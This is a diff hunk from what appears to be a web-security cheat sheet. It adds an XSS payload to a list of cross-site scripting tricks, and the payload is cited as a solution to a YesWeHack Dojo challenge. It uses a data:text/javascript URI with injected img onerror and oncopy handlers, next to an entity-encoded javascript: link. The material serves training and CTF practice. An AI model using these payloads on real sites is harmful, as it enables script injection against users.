@@ -2368,7 +2368,10 @@ Manually testing for XXE vulnerabilities generally involves
   <a href=jav%26%23x61%3bscript:alert()>
   ```
   - [source 1](https://twitter.com/TakSec/status/1649091314842238978), [source 2](https://brutelogic.com.br/blog/alternative-javascript-pseudo-protocol/)
-
+- ```HTML
+  data:text/javascript,console.log(3 + '\n' + `};console.log(1);//<img src=x onerror=javascript:console.log(2) oncopy=console.log(4)>`);//&quot; onerror=console.log(5) id=&quot;x
+  ```
+  - For the challenge [5Ways2XSS - DOJO #23 | YesWeHack](https://dojo-yeswehack.com/practice/d5e8e5ddf9af)
 
 ### <ins>Cross-site request forgery (CSRF)</ins>
 
